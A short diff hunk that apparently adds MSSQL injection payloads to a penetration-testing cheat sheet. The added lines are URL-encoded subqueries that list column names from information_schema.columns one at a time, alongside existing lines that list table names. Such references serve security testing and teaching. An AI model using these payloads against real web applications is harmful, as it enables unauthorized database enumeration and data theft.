@@ -2013,6 +2013,9 @@ user_name()
 (select+top+1+table_name+from+information_schema.tables) # first table
 (select+top+1+table_name+from+information_schema.tables+where+table_name+
     not+in+('first_table_name_here','second_table_name_here')) # subsequent tables
+### column names
+(select+top+1+column_name+from+information_schema.columns+where+table_name='table_name_here') # first column
+(select+top+1+column_name+from+information_schema.columns+where+table_name='table_name_here'+and+column_name+not+in+('first_column_name_here')) # subsequent columns
 ```
 
 
